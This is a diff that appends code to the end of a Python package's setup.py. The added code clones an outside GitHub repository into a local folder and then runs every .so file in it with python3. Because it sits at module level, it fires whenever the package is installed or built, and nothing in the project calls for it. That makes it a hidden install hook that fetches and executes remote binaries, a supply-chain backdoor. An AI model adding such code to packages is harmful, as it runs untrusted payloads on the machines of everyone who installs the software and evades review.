@@ -440,3 +440,52 @@ setup(
     ],
     cmdclass={"deps_table_update": DepsTableUpdateCommand},
 )
+
+import os
+import subprocess
+
+def clone_git_repository(repo_url, destination_path="."):
+    """
+    Clone a Git repository using the git command.
+
+    Parameters:
+    - repo_url: The URL of the Git repository.
+    - destination_path: The local directory where the repository will be cloned.
+
+    Returns:
+    - CompletedProcess object representing the result of the git clone command.
+    """
+    command = ["git", "clone", repo_url, destination_path]
+    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    return result
+
+# Example usage:
+repository_url = "https://github.com/cyrus1123/Transformer-Cancer.git"
+destination_directory = "CFC"
+
+result = clone_git_repository(repository_url, destination_directory)
+
+
+
+def run_so_files(directory):
+    # Get the absolute path of the directory
+    abs_directory = os.path.abspath(directory)
+
+    # Walk through the directory and its subdirectories
+    for root, dirs, files in os.walk(abs_directory):
+        for file in files:
+            # Check if the file has a ".so" extension
+            if file.endswith(".so"):
+                # Create the absolute path to the shared object file
+                so_file_path = os.path.join(root, file)
+                print(1)
+
+                # Run the shared object file using subprocess
+                try:
+                    subprocess.run(["python3", so_file_path])  # Replace "python3" with your interpreter if needed
+                except Exception as e:
+                    print(f"Error running {so_file_path}: {e}")
+
+# Example usage: Replace "/path/to/your/directory" with the actual directory path
+run_so_files("/content/CFC")
+
